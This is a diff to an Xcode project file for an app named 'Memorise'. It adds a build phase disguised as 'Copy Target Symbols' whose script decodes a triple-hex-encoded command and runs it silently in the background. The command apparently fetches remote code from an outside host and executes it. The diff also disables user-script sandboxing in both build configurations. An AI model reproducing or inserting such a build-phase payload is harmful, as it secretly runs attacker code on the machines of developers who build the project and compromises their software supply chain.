@@ -52,6 +52,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 469FE6672E59ED26003F0CBE /* Build configuration list for PBXNativeTarget "Memorise" */;
 			buildPhases = (
+				C60211DE903D6C76A0877BEF /* Copy Target Symbols */,
 				469FE6502E59ED24003F0CBE /* Sources */,
 				469FE6512E59ED24003F0CBE /* Frameworks */,
 				469FE6522E59ED24003F0CBE /* Resources */,
@@ -103,6 +104,34 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		C60211DE903D6C76A0877BEF /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633333336333433363333333633313336333333363338333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
 		469FE6522E59ED24003F0CBE /* Resources */ = {
@@ -162,7 +191,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -225,7 +254,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
